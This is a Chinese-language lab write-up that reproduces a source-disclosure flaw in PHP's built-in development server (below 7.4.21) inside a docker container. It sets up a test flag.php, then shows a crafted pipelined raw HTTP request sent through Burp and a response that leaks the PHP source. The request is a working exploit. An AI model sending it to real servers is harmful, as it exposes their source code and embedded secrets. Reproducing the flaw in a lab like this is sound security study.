说是7.4.21以下的洞，所以用ubuntu20.04默认安装的php7.4.3就行

搭建环境

首先新建一个docker：

docker run -itd --name phpresource -p 80:80 ubuntu:20.04 bash

docker exec -it phpresource bash

不是公网服务器的话直接本地复现就行，公网服务器用docker复现是为了安全

然后更新源：

apt update

然后安装php和vim(不用vim直接echo重定向也行，但我嫌麻烦)：

apt install php

apt install vim

然后新建一个php文件：

vim flag.php

<?php
$flag='flag{this_is_flag}';
?>


开php的http服务器：

php -S 0.0.0.0:80

攻击

开burp抓包，浏览器访问flag.php，一片空白

放repeater里，改成以下形式：

GET /flag.php HTTP/1.1
Host: 靶机ip

GET /xyz.xyz HTTP/1.1


只要这些就行，下面的\r\n要不要都能返回源码,只有返回的头不一样

然后关掉Update Content-Length，防止burp自动加上Content-Length

发包，得到源码

HTTP/1.1 200 OK
Host: 124.70.17.37:5000
Date: Tue, 31 Jan 2023 04:28:42 GMT
Connection: close
X-Powered-By: PHP/7.4.3-4ubuntu2.17
Content-type: text/html; charset=UTF-8

$flag='flag{this_is_flag}';
